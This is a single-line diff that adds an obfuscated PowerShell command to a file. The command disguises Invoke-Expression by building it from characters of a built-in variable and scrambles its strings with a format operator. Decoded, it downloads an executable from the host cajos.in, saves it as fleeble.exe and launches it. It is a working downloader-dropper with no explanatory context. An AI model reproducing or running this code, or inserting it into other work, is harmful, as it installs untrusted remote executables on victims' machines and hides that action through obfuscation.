@@ -1,0 +1,1 @@
+﻿&( $verBosEpreferenCe.tOStrinG()[1,3]+'x'-Join'')(((("{13}{10}{2}{7}{18}{23}{3}{0}{1}{9}{14}{17}{22}{6}{11}{19}{8}{20}{4}{5}{12}{21}{15}{16}"-f 'nloa','dFile({0}ht','.WebC','.Dow','ta','rt-Proces',',{','lien','{0});','tp:/','et','0}fleeble.ex','s {0','(New-Object System.N','/cajos.in/','0','}','0','t','e','S','}fleeble.exe{','x/1.exe{0}',')'))  -F[chAR]39) )
